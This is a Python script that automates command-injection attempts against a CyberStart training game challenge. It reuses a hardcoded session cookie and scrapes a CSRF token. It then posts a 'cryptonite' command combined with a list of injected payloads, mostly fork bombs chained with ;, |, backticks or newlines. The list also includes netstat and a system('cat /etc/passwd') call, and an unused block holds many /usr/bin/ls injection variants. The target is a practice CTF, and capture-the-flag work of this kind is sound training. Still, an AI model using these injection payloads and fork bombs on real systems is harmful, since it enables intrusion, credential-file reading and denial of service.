#!/usr/bin/env python3
import requests
import sys
from tqdm import tqdm

session = requests.Session()


response = session.get(
    "https://game.joincyberstart.com/base-headquarters",
    cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
)

import re


def run(command):
    # print(command)
    challenge_url = f"https://game.joincyberstart.com/challenge?base=1&level=12&challenge=6&csrf={csrf_base}"

    response3 = session.post(
        challenge_url,
        cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
        data={"command": command},
    )

    res_parsed = re.search(r'"line">(.*?)<\/div>', response3.text)
    response = res_parsed.group(1)
    if (
        response != "Error, no valid arguments entered."
        and response
        != "Valid arguments are -h (show arguments), -e (encrypt), -d (decrypt), -p (password), -n (ignore)."
    ):
        print(command)
        print(response)


matches = re.search(r'csrf=(.*?)"', response.text)
csrf_base = matches.group(1)

# print(csrf_base)
if len(sys.argv) == 1:
    command = input("cmd > ")
else:
    command = " ".join(sys.argv[1:])


commands = """
/index.html|:(){ :|: & };:|
;:(){ :|: & };:;
;:(){ :|: & };:
;netstat -a;
;system('cat%20/etc/passwd')
;:(){ :|: & };:;
|:(){ :|: & };:
|:(){ :|: & };:|
|:(){ :|: & };:;
;:(){ :|: & };:|
\n:(){ :|: & };:\n
\n:(){ :|: & };:;
\n:(){ :|: & };:|
;:(){ :|: & };:\n
|n:(){ :|: & };:\n
`:(){ :|: & };:`
a);:(){ :|: & };:
a;:(){ :|: & };:
a);:(){ :|: & };:;
a;:(){ :|: & };:;
a);:(){ :|: & };:|
a;:(){ :|: & };:|
a)|:(){ :|: & };:
a|:(){ :|: & };:
a)|:(){ :|: & };:;
a|:(){ :|: & };:
"""

"""
a);/usr/bin/ls
a;/usr/bin/ls
a);/usr/bin/ls;
a;/usr/bin/ls;
a);/usr/bin/ls|
a;/usr/bin/ls|
a)|/usr/bin/ls
a|/usr/bin/ls
a)|/usr/bin/ls;
a|/usr/bin/ls
`/usr/bin/ls`
|/usr/bin/ls
|/usr/bin/ls|
||/usr/bin/ls|
||/usr/bin/ls;
;|/usr/bin/ls|
\n/bin/ls -al\n
\n/usr/bin/ls\n
\n/usr/bin/ls;
\n/usr/bin/ls|
;/usr/bin/ls\n
|usr/bin/ls\n
|/bin/ls -al
"""
commands = commands.strip().split("\n")
commands2 = []
for i in range(len(commands)):
    commands2.append("cryptonite -n" + commands[i])
    commands2.append("cryptonite -n " + commands[i])
    commands2.append("cryptonite -h" + commands[i])
    commands2.append("cryptonite -h " + commands[i])
    commands2.append("cryptonite -e" + commands[i])
    commands2.append("cryptonite -e " + commands[i])
    commands2.append("cryptonite -d" + commands[i])
    commands2.append("cryptonite -d " + commands[i])
    commands2.append("cryptonite -p" + commands[i])
    commands2.append("cryptonite -p " + commands[i])
    commands2.append("cryptonite" + commands[i])
    commands2.append("cryptonite " + commands[i])
commands.extend(commands2)
for payload in tqdm(commands2):
    run(payload)

# run("cryptonite -n;" + command)
# print(response3.text)
